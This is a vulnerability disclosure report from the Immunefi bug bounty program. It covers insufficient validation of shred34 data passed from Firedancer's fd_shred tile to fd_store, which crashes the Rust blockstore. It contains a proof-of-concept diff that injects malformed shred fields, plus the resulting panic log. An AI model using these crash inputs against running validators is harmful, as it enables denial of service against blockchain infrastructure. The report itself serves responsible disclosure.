# Boost \_ Firedancer v0.1 33718 - \[Blockchain\_DLT - Medium] The malicious fd\_shred\_t data passed betwe

Submitted on Sat Jul 27 2024 08:49:17 GMT-0400 (Atlantic Standard Time) by @c4a4dda89 for [Boost | Firedancer v0.1](https://immunefi.com/bounty/firedancer-boost/)

Report ID: #33718

Report type: Blockchain/DLT

Report severity: Medium

Target: <https://github.com/firedancer-io/firedancer/tree/e60d9a6206efaceac65a5a2c3a9e387a79d1d096>

Impacts:

* Process to process RCE between sandboxed tiles

## Description

## Brief/Intro

The `fd_mux_during_frag_fn` is called after the mux has received a new frag.

```c
/* fd_mux_during_frag_fn is called after the mux has received a new frag
   from an in, but before the mux has checked that it was overrun.  This
   callback is not invoked if the mux is backpressured, as it would not
   try and read a frag from an in in the first place (instead, leaving
   it on the in mcache to backpressure the upstream producer).  in_idx
   will be the index of the in that the frag was received from.

   If the producer of the frags is respecting flow control, it is safe
   to read frag data in any of the callbacks, but it is suggested to
   copy or read frag data within this callback, as if the producer does
   not respect flow control, the frag may be torn or corrupt due to an
   overrun by the reader.  If the frag being read from has been
   overwritten while this callback is running, the frag will be ignored
   and the mux will not call the process function.  Instead it will
   recover from the overrun and continue with new frags.

   This function cannot fail.  If opt_filter is set to non-zero, it
   means the frag should be filtered and not passed on to downstream
   consumers of the mux.

   The ctx is a user-provided context object from when the mux tile was
   initialized.

   seq, sig, chunk, and sz are the respective fields from the mcache
   fragment that was received.  If the producer is not respecting flow
   control, these may be corrupt or torn and should not be trusted,
   except for seq which is read atomically. */

typedef void (fd_mux_during_frag_fn)( void * ctx,
                                      ulong  in_idx,
                                      ulong  seq,
                                      ulong  sig,
                                      ulong  chunk,
                                      ulong  sz,
                                      int *  opt_filter );
```

Specifically, the parameters `seq`, `sig`, `chunk`, and `sz` originate from the received mcache fragment. Since the producer could be compromised, these fields are considered untrusted.

## Vulnerability Details

In the `during_frag` function of `fd_store`, the data passed from `fd_shred` is directly saved into `ctx->mem`.

```c
static inline void
during_frag( void * _ctx,
             ulong  in_idx,
             ulong  seq,
             ulong  sig,
             ulong  chunk,
             ulong  sz,
             int *  opt_filter ) {
  (void)sig;
  (void)seq;
  (void)in_idx;
  (void)opt_filter;

  fd_store_ctx_t * ctx = (fd_store_ctx_t *)_ctx;

  if( FD_UNLIKELY( chunk<ctx->in[ in_idx ].chunk0 || chunk>ctx->in[ in_idx ].wmark || sz>FD_SHRED_STORE_MTU || sz<32UL ) )
    FD_LOG_ERR(( "chunk %lu %lu corrupt, not in range [%lu,%lu]", chunk, sz, ctx->in[ in_idx ].chunk0, ctx->in[ in_idx ].wmark ));

  uchar * src = (uchar *)fd_chunk_to_laddr( ctx->in[in_idx].mem, chunk );

  fd_memcpy( ctx->mem, src, sz );
}
```

In the subsequent `after_frag` code, only part of the `fd_shred34_t` data structure was checked, and the contents of the `pkts[34]` array included in the `fd_shred34_t` were not verified for legitimacy, leading to a crash in the `fd_ext_blockstore_insert_shreds` function when parsing memory, within the Rust implementation of Solana.

```c
static inline void
after_frag( void *             _ctx,
            ulong              in_idx,
            ulong              seq,
            ulong *            opt_sig,
            ulong *            opt_chunk,
            ulong *            opt_sz,
            ulong *            opt_tsorig,
            int *              opt_filter,
            fd_mux_context_t * mux ) {
  (void)in_idx;
  (void)seq;
  (void)opt_chunk;
  (void)opt_tsorig;
  (void)opt_filter;
  (void)mux;

  fd_store_ctx_t * ctx = (fd_store_ctx_t *)_ctx;

  fd_shred34_t * shred34 = (fd_shred34_t *)ctx->mem;

  FD_TEST( shred34->shred_sz<=shred34->stride );   
  if( FD_LIKELY( shred34->shred_cnt ) ) {
    FD_TEST( shred34->offset<*opt_sz  );
    FD_TEST( shred34->shred_cnt<=34UL );
    FD_TEST( shred34->stride==sizeof(shred34->pkts[0]) );
  }

  /* No error code because this cannot fail. */
  fd_ext_blockstore_insert_shreds( fd_ext_blockstore, shred34->shred_cnt, ctx->mem+shred34->offset, shred34->shred_sz, shred34->stride, !!*opt_sig ); //call solana code

  FD_MCNT_INC( STORE_TILE, TRANSACTIONS_INSERTED, shred34->est_txn_cnt );
}

```

```rust
/// FIREDANCER: Insert shreds received from the shred tile into the blockstore
#[no_mangle]
pub extern "C" fn fd_ext_blockstore_insert_shreds(blockstore: *const std::ffi::c_void, shred_cnt: u64, shred_bytes: *const u8, shred_sz: u64, stride: u64, is_trusted: i32) {
    let blockstore = unsafe { &*(blockstore as *const Blockstore) };
    let shred_bytes = unsafe { std::slice::from_raw_parts(shred_bytes, (stride * (shred_cnt - 1) + shred_sz) as usize) };
    let shreds = (0..shred_cnt).map(|i| {
        let shred: &[u8] = &shred_bytes[(stride*i) as usize..(stride*i+shred_sz) as usize]; //crash here
        Shred::new_from_serialized_shred(shred.to_vec()).unwrap()
    }).collect();

    /* The unwrap() here is not a mistake or laziness.  We do not
       expect inserting shreds to fail, and cannot recover if it does.
       Solana Labs panics if this happens and Firedancer will as well. */
    blockstore.insert_shreds(shreds, None, is_trusted!=0).unwrap();
}
```

## Impact Details

Process-to-process memory corruption may lead to the process-to-process RCE between sandboxed tiles.

## References

1. <https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/app/fdctl/run/tiles/fd\\_store.c#L68>
2. <https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/app/fdctl/run/tiles/fd\\_store.c#L108>
3. <https://github.com/firedancer-io/solana/blob/85ef9192fc04c27f31f2090e832f254bdc57164e/ledger/src/blockstore.rs#L298>

## Proof of concept

The attack surface of this vulnerability is when an attacker has arbitrary code execution rights over `fd_shred`, and then launches a process to process RCE attack on `fd_store`. Therefore, we modify the relevant code of the `fd_shred` process to simulate the situation where the attacker has already obtained the ability to execute code.

The project side realized that the modified content shown by the git diff needs to be synchronized to the local environment. By executing make -j fddev and sudo fddev --no-sandbox, a crash can be triggered.

```c
diff --git a/src/app/fdctl/run/tiles/fd_shred.c b/src/app/fdctl/run/tiles/fd_shred.c
index 193a4b3d..87f9a86b 100644
--- a/src/app/fdctl/run/tiles/fd_shred.c
+++ b/src/app/fdctl/run/tiles/fd_shred.c
@@ -602,6 +602,23 @@ after_frag( void *             _ctx,
   /* Add whatever is left to the last shred34 */
   s34[ fd_ulong_if( s34[ 3 ].shred_cnt>0UL, 3, 2 ) ].est_txn_cnt += ctx->shredded_txn_cnt - txn_per_s34*s34_cnt;

+
+  //poc1
+  s34[0].pkts[0].shred.fec_set_idx=((uint)-1);
+
+  //poc2
+  /*
+  for (int i = 0 ; i!=4;i++){
+    s34[i].pkts[0].shred.data.size=255;
+  }
+  */
+  //poc3
+  /*
+  for (int i = 0 ; i!=4;i++){
+    s34[i].pkts[0].shred.data.parent_off=255;
+  }
+  */
+
   /* Send to the blockstore, skipping any empty shred34_t s. */
   ulong sig = in_idx!=NET_IN_IDX; /* sig==0 means the store tile will do extra checks */
   ulong tspub = fd_frag_meta_ts_comp( fd_tickcount() );
```

After making the following modifications to the code, executing `make -j fddev` and then running `sudo fddev --no-sandbox` will trigger a crash.

```shell

...
thread '<unnamed>' panicked at ledger/src/blockstore.rs:299:58:
called `Result::unwrap()` on an `Err` value: InvalidErasureShardIndex((ShredCommonHeader { signature: wUTba7NxTNAN4rKkX49WMhtF8hqm9uweqstrL3quC7voLTwXZNqUUo9dMeX62hYhzqeuyvB1a2YLXTpE8A9n8S1, shred_variant: MerkleData { proof_size: 5, chained: false, resigned: false }, slot: 1, index: 0, version: 46355, fec_set_index: 4294967295 }, DataShredHeader { parent_offset: 1, flags: ShredFlags(0x0), size: 1103 }))
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
ERR     07-27 14:06:06.053931 693837 f17  0    metrics/src/metrics.rs(283): datapoint: panic program="validator" thread="?" one=1i message="panicked at ledger/src/blockstore.rs:299:58:
called `Result::unwrap()` on an `Err` value: InvalidErasureShardIndex((ShredCommonHeader { signature: wUTba7NxTNAN4rKkX49WMhtF8hqm9uweqstrL3quC7voLTwXZNqUUo9dMeX62hYhzqeuyvB1a2YLXTpE8A9n8S1, shred_variant: MerkleData { proof_size: 5, chained: false, resigned: false }, slot: 1, index: 0, version: 46355, fec_set_index: 4294967295 }, DataShredHeader { parent_offset: 1, flags: ShredFlags(0x0), size: 1103 }))" location="ledger/src/blockstore.rs:299:58" version="0.101.11817 (src:e60d9a62; feat:4215500110, client:Firedancer)"
ERR     07-27 14:06:06.164377 693744 f0   pidns src/app/fdctl/run/run.c(368): tile solana-labs:0 exited with code 1
...

```

Only the crash log for PoC1 is listed here. Replacing the code of PoC1 with PoC2 and PoC3 will yield different crash reasons. We believe that there are at least three different vulnerabilities in the parsing code here that could lead to crashes.
